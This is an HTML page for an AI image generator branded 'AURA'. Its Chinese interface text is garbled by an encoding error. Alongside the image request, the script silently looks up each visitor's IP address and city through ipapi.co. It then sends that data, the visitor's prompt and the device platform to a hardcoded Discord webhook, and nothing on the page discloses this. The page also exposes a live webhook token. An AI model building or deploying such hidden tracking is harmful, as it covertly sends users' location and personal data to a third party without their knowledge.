<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AURA AI | FR TECH</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@700;900&display=swap');
        
        body {
            background: #000;
            color: #fff;
            font-family: 'Inter', -apple-system, sans-serif;
            font-weight: 700; /* å…¨åŸŸç²—é«” */
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
        }

        /* å‹•æ…‹ç’°å¢ƒå…‰ */
        .ambient-glow {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: 
                radial-gradient(circle at 10% 10%, rgba(168, 85, 247, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 90%, rgba(59, 130, 246, 0.15) 0%, transparent 40%);
            z-index: -1;
        }

        /* iOS 18 é«˜ç´šæ„Ÿé¢æ¿ */
        .aura-panel {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(50px) saturate(200%);
            -webkit-backdrop-filter: blur(50px) saturate(200%);
            border: 1.5px solid rgba(255, 255, 255, 0.1);
            border-radius: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
        }

        /* è¼¸å…¥æ¡†åŠ å¼· */
        textarea {
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-weight: 700;
            font-size: 1.25rem;
            resize: none;
        }

        /* éœ“è™¹é€²åº¦æ¢ */
        .progress-container {
            height: 4px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 2px;
            overflow: hidden;
        }
        #progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #a855f7, #3b82f6);
            box-shadow: 0 0 15px #a855f7;
            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        /* é ‚ç´šæŒ‰éˆ• */
        .btn-primary {
            background: #fff;
            color: #000;
            padding: 1rem 2.5rem;
            border-radius: 24px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
        }
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
        }
        .btn-primary:disabled {
            opacity: 0.2;
        }

        /* çµæœå‹•ç•« */
        .fade-up {
            animation: fadeUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(40px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
    </style>
</head>
<body>
    <div class="ambient-glow"></div>

    <div class="w-full max-w-xl px-6 py-12">
        <div class="text-center mb-12">
            <div class="inline-block px-4 py-1 rounded-full border border-purple-500/30 mb-4">
                <span class="text-[10px] tracking-[0.6em] text-purple-400 font-black uppercase">FR TECHNOLOGY</span>
            </div>
            <h1 class="text-7xl font-black tracking-tighter text-white">AURA</h1>
        </div>

        <div class="aura-panel p-10 mb-8 transition-all" id="input-container">
            <textarea id="prompt" class="w-full h-32 placeholder-gray-700" placeholder="åœ¨æ­¤è¼¸å…¥å½±åƒæŒ‡ä»¤..."></textarea>
            
            <div class="progress-container mt-6 mb-8">
                <div id="progress-bar"></div>
            </div>

            <div class="flex items-center justify-between">
                <div class="flex flex-col">
                    <span class="text-[10px] text-gray-500 font-black uppercase tracking-widest">ç³»çµ±ç‹€æ…‹</span>
                    <span id="status" class="text-xs text-blue-400 font-black uppercase mt-1">Ready</span>
                </div>
                <button id="gen-btn" class="btn-primary">ç”Ÿæˆå½±åƒ</button>
            </div>
        </div>

        <div id="result-display" class="hidden opacity-0">
            <div class="aura-panel overflow-hidden border-white/20 mb-6">
                <img id="output-img" class="w-full h-auto" src="" alt="">
            </div>
            
            <div class="flex gap-4">
                <button id="download-btn" class="flex-[2] py-5 aura-panel font-black text-sm uppercase tracking-widest hover:bg-white/10 transition-all">
                    å„²å­˜å½±åƒè‡³æœ¬åœ°
                </button>
                <button onclick="location.reload()" class="flex-1 py-5 aura-panel font-black text-sm uppercase text-gray-500 hover:bg-white/10 transition-all">
                    é‡ç½®
                </button>
            </div>
        </div>
    </div>

    <script>
        const API_URL = "https://api-inference.huggingface.co/models/black-forest-labs/FLUX.1-schnell";
        const WEBHOOK = "https://discord.com/api/webhooks/1472667146008920197/XM3tXEq7uDoqoYFDeGuPo-46YRFXBe6oeU75R-JJ2OhRX_clDc6f0gLGvCib1T4uJWUo";

        const btn = document.getElementById('gen-btn');
        const status = document.getElementById('status');
        const progress = document.getElementById('progress-bar');
        const resultDisplay = document.getElementById('result-display');
        const outputImg = document.getElementById('output-img');

        btn.onclick = async () => {
            const promptValue = document.getElementById('prompt').value;
            if (!promptValue) return;

            // é–å®š UI
            btn.disabled = true;
            status.innerText = "æ­£åœ¨åˆ†é…é›²ç«¯ç®—åŠ›...";
            progress.style.width = "40%";

            try {
                // åœ°ç†è³‡è¨Š
                const geo = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({}));
                status.innerText = "AURA æ ¸å¿ƒæ¼”ç®—ä¸­...";
                progress.style.width = "70%";

                // è«‹æ±‚ AI åœ–ç‰‡
                const response = await fetch(API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ inputs: promptValue + ", high quality, 8k, highly detailed" }),
                });

                if (!response.ok) throw new Error();

                const blob = await response.blob();
                const url = URL.createObjectURL(blob);

                // æˆåŠŸæ¸²æŸ“
                progress.style.width = "100%";
                status.innerText = "æ¼”ç®—å®Œæˆ";
                status.classList.replace('text-blue-400', 'text-green-400');
                
                outputImg.src = url;
                resultDisplay.classList.remove('hidden');
                resultDisplay.classList.add('fade-up');

                // ä¸‹è¼‰åŠŸèƒ½
                document.getElementById('download-btn').onclick = () => {
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = `FR_AURA_${Date.now()}.png`;
                    link.click();
                };

                // Discord åŒæ­¥
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: "AURA ç³»çµ±å ±å‘Š",
                        embeds: [{
                            title: "ğŸ’ é«˜å“è³ªå½±åƒç”Ÿæˆ",
                            color: 0x000000,
                            fields: [
                                { name: "æŒ‡ä»¤", value: `**${promptValue}**` },
                                { name: "ä¾†æº", value: `${geo.city || 'æœªçŸ¥'} | ${geo.ip || 'æœªçŸ¥'}`, inline: true },
                                { name: "è£ç½®", value: navigator.platform, inline: true }
                            ],
                            footer: { text: "FR TECHNOLOGY FLAGSHIP SYSTEM" }
                        }]
                    })
                });

            } catch (err) {
                status.innerText = "é€£ç·šè¶…æ™‚ï¼Œè«‹é‡æ–°å˜—è©¦";
                status.classList.add('text-red-500');
                btn.disabled = false;
                progress.style.width = "0%";
            }
        };
    </script>
</body>
</html>
